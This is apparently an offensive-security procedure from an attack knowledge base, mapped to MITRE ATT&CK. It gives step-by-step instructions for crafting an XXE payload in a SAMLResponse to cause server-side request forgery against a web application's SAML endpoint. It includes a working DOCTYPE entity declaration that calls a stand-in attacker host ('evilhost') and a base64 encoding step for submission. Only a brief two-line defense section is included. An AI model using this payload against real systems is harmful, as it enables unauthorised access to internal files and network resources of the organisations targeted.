---
tags:
  - xxe
  - saml
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0a8329b7-2800-461a-84ee-25e101592834
created_at: '2025-12-13T09:01:26.349Z'
updated_at: '2025-12-13T09:01:26.349Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious XXE Payload in SAMLResponse

## Summary

This procedure involves creating a malicious XML payload for a SAMLResponse that exploits an XML External Entity (XXE) vulnerability by declaring an external entity that references an attacker-controlled resource, enabling SSRF when parsed.

## Description

In this attack scenario, the target is a web application's SAML authentication endpoint that insecurely parses XML. The procedure crafts an XML document with a DOCTYPE declaration including an entity that points to an external URL, which the server will attempt to fetch during parsing. This can lead to disclosure of internal files or network resources. Prerequisites include knowledge of the SAML structure and an attacker-controlled server.

## Requirements

1. Text editor or XML crafting tool
2. Base64 encoding capability
3. Attacker-controlled HTTP server for callback

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in XML parsers
- Monitor for unexpected outbound requests from the server

## Objectives

1. Create a payload that triggers XXE
2. Enable SSRF for resource disclosure
3. Confirm exploitation via callback

## Instructions

### Step 1: Construct XML Payload

**Context**: Build the XML with the XXE entity declaration.

Create the following XML structure:

```xml
<!DOCTYPE foo [ <!ENTITY % asd SYSTEM "http://evilhost"> %asd;]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <!-- Additional SAML elements as needed -->
</samlp:Response>
```

> This declares an entity 'asd' that fetches from the external URL.

### Step 2: Base64 Encode Payload

**Context**: Encode the XML for inclusion in the request body.

Use a base64 encoder (e.g., base64 command in Linux):

```bash
base64 payload.xml > encoded.txt
```

> The output is a base64 string ready for the SAMLResponse parameter.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xxe]]
- [[saml]]
